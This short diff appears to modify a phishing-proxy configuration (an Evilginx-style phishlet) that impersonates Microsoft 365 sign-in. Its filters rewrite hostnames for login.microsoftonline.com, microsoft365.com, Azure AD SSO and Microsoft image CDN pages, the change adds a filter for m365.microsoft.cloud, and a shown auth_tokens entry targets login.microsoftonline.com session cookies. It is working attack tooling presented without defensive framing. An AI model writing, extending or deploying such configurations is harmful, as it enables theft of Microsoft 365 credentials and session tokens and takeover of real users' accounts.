@@ -19,7 +19,8 @@ sub_filters:
   - {triggers_on: 'www.microsoft365.com', orig_sub: 'www', domain: 'microsoft365.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'autologon.microsoftazuread-sso.com', orig_sub: 'autologon', domain: 'microsoftazuread-sso.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/xhtml+xml', 'application/xml']}
   - {triggers_on: 'aadcdn.msftauthimages.net', orig_sub: 'aadcdn', domain: 'aadcdn.msftauthimages.net', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['image/avif', 'image/webp', 'image/png', 'image/svg+xml', 'image/*']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/x-www-form-urlencoded'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/x-www-form-urlencoded']}
+  - {triggers_on: 'm365.microsoft.cloud', orig_sub: 'm365', domain: 'microsoft.cloud', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/x-www-form-urlencoded'], redirect_only: true}
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
